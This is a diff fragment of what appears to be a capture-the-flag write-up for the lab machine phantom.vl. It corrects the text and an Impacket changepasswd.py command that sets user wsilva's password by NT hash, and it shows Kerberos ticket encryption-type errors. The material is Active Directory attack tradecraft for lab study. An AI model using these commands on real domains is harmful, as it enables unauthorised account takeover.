@@ -714,10 +714,10 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
 ```
 
-Then ill use this impacket script to get the ticket session key, as seen above its using rc4 instead o aes256_cts_hmac_sha1_96
+Then ill use this impacket script to get the ticket session key, as seen above its using rc4 instead of `aes256_cts_hmac_sha1_96` this is the reason i had to use pypykatz
 
 ```python
-changepasswd.py -newhashes ':547507c1fd1b1c7312e896f082e209322361fc166d4d51446913a697fe2478ee' phantom.vl/wsilva:'Password123!'@dc.phantom.vl
+changepasswd.py -newhashes ':5dc4a686c981d0c04c3c648f4e1cfb9c' phantom.vl/wsilva:'Password123!'@dc.phantom.vl
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Changing the password of phantom.vl\wsilva
